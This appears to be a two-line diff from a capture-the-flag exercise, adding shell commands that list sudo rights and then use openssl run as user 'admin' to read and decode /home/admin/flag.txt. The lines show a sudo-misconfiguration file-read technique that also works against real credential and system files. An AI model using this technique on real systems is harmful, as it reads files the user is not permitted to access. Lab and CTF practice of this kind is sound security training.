@@ -1,0 +1,2 @@
+sudo -l
+sudo -u admin openssl base64 -in /home/admin/flag.txt | base64 --decode
